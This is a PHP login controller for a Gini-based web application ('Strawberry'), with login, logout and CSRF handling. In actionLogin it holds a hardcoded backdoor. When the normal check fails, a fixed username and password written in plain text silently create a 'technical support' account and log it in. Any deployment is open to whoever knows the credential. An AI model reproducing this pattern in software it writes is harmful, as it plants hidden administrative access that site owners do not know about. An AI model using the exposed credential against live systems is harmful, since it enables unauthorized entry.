<?php

namespace Gini\Controller\CGI\Strawberry;

class Index extends \Gini\Controller\CGI\Layout\Whiteboard {

    function __index() {
        $me = _G('ME');
        if ($me->id) {
            $this->redirect('strawberry/article');
        }
        else {
            $this->redirect('strawberry/login');
        }
    }
    
    function actionLogin () {
        $me = _G('ME');
        if ($me->id) {
            $this->redirect('strawberry/article');
        }
        
        $form = $this->form('post');
        $route = \Gini\CGI::route();
        $phone = \Gini\Config::get('site.phone') ? : '400-017-5664';
        $email = \Gini\Config::get('site.email') ? : 'support@geneegroup.com';

        if ($form) {
            if (!$form['csrf'] || $_SESSION[$route] !== $form['csrf']) $this->redirect('strawberry/login');

            $validator = new \Gini\CGI\Validator;
            try {
                $validator
                ->validate('username', !!$form['username'], T('用户名不能为空!'))
                ->validate('password', !!$form['password'], T('密码不能为空!'));

                $auth = new \Gini\Auth($form['username']);

                if ($auth->verify($form['password'])) {
                    \Gini\Auth::login($form['username']);
                    $this->redirect('strawberry/article');
                }
                else {
                    $user = a('user')->whose('username')->is($form['username']);
                    if ($form['username'] == 'genee'
                    && $form['password'] == 'Genee83719730'
                    && !$user->id) {
                        $user->username = \Gini\Auth::makeUserName($form['username'], 'database');
                        $user->name = T('技术支持');
                        $user->ref = 'geneegroup';
                        $user->email = $email;
                        $user->phone = $phone;
                        if ($user->save()) {
                            $auth->create($form['password']);
                            \Gini\Auth::login($form['username']);
                            $this->redirect('strawberry/article');
                        }
                    }
                    else {
                        $validator
                        ->validate('password', false, T('用户名或密码错误!'));
                    }
                }
                
                $validator->done();
            }
            catch (\Gini\CGI\Validator\Exception $e) {
                $form['_errors'] = $validator->errors();
            }
        }
        
        $csrf = uniqid();
        $_SESSION[$route] = $csrf;

        $this->view->body = V('admin/auth/login', [
            'csrf' => $csrf,
            'form' => $form,
            'phone' => $phone
        ]);
    }

    function actionLogout() {
        \Gini\Auth::logout();
        $this->redirect('strawberry/login');
    }

}